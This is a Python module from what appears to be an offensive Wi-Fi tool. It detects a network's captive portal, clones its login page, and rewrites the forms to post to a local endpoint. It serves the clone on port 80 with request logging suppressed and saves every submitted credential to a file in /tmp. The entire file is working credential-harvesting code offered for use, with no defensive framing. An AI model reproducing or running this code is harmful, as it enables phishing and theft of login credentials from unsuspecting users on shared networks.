"""
portal.py — Captive portal detection, cloning, and credential harvesting

Clones the target portal's HTML/CSS/JS, serves an identical copy,
and captures any credentials submitted through it.
"""

import os, re, threading, urllib.parse
from pathlib import Path
from typing import Optional, Callable

try:
    import requests
    from bs4 import BeautifulSoup
    from flask import Flask, request, redirect, send_from_directory, Response
except ImportError:
    raise SystemExit("Install deps: pip install requests beautifulsoup4 flask")

from . import tui

CLONE_DIR = Path("/tmp/fracture_portal")
CRED_FILE = Path("/tmp/fracture_creds.txt")

# ── detection ─────────────────────────────────────────────────────────────────

# Common captive portal detection URLs — same ones browsers use
PROBE_URLS = [
    "http://connectivitycheck.gstatic.com/generate_204",
    "http://captive.apple.com/hotspot-detect.html",
    "http://www.msftncsi.com/ncsi.txt",
]

def detect_portal_url(gateway_ip: str, timeout: int = 5) -> Optional[str]:
    """
    Try to reach connectivity-check URLs via the gateway.
    If we get a redirect instead of the expected response, that redirect
    URL is the captive portal's login page.
    Returns the portal URL or None.
    """
    for probe in PROBE_URLS:
        try:
            r = requests.get(
                probe,
                timeout=timeout,
                allow_redirects=False,
                headers={"User-Agent": "Mozilla/5.0"},
            )
            if r.status_code in (301, 302, 303, 307, 308):
                portal_url = r.headers.get("Location", "")
                if portal_url:
                    tui.success(f"Portal detected via redirect → {portal_url}")
                    return portal_url
            # Apple check: expects "Success" in body
            if "apple" in probe and "Success" not in (r.text or ""):
                # Something intercepted it — try to find portal from body
                urls = re.findall(r'https?://[^\s"\'<>]+', r.text)
                if urls:
                    tui.success(f"Portal detected in body → {urls[0]}")
                    return urls[0]
        except Exception:
            continue
    return None

# ── cloning ───────────────────────────────────────────────────────────────────

def clone_portal(url: str) -> Optional[Path]:
    """
    Fetch the portal URL and save a local copy with all assets inlined.
    Modifies form action to point to our credential harvester (/submit).
    Returns path to the cloned index.html or None on failure.
    """
    try:
        CLONE_DIR.mkdir(parents=True, exist_ok=True)
        tui.info(f"Cloning portal: {url}")

        r = requests.get(url, timeout=10, verify=False,
                         headers={"User-Agent": "Mozilla/5.0"})
        r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")

        # Inline CSS
        for tag in soup.find_all("link", rel="stylesheet"):
            href = tag.get("href")
            if href:
                try:
                    abs_url = urllib.parse.urljoin(url, href)
                    css = requests.get(abs_url, timeout=5, verify=False).text
                    style = soup.new_tag("style")
                    style.string = css
                    tag.replace_with(style)
                except Exception:
                    pass

        # Rewrite form actions to our harvester
        for form in soup.find_all("form"):
            form["action"] = "/submit"
            form["method"] = "post"

        # Add hidden field to capture original URL
        for form in soup.find_all("form"):
            hidden = soup.new_tag("input", type="hidden",
                                   name="_origin", value=url)
            form.append(hidden)

        index_path = CLONE_DIR / "index.html"
        index_path.write_text(str(soup), encoding="utf-8")
        tui.success(f"Portal cloned → {index_path}")
        return index_path

    except Exception as e:
        tui.error(f"Clone failed: {e}")
        return None

# ── serving ───────────────────────────────────────────────────────────────────

def serve_portal(
    on_cred: Callable[[dict], None],
    port: int = 80,
    redirect_url: str = "http://google.com"
):
    """
    Serve the cloned portal on port 80 (requires root).
    Calls on_cred(fields) when a form is submitted.
    Blocks until stopped — run in a thread.
    """
    app = Flask(__name__, static_folder=str(CLONE_DIR))
    app.config["SECRET_KEY"] = os.urandom(16)
    log = open(os.devnull, 'w')

    @app.route("/", defaults={"path": ""})
    @app.route("/<path:path>")
    def serve(path):
        if path and (CLONE_DIR / path).exists():
            return send_from_directory(str(CLONE_DIR), path)
        index = CLONE_DIR / "index.html"
        if index.exists():
            return index.read_text(encoding="utf-8")
        return "<h1>Loading…</h1>", 200

    @app.route("/submit", methods=["POST"])
    def submit():
        fields = dict(request.form)
        fields.pop("_origin", None)
        tui.success(f"Credentials captured: {fields}")
        # Persist
        with open(CRED_FILE, "a") as f:
            f.write(str(fields) + "\n")
        on_cred(fields)
        return redirect(redirect_url)

    import logging
    logging.getLogger("werkzeug").disabled = True
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
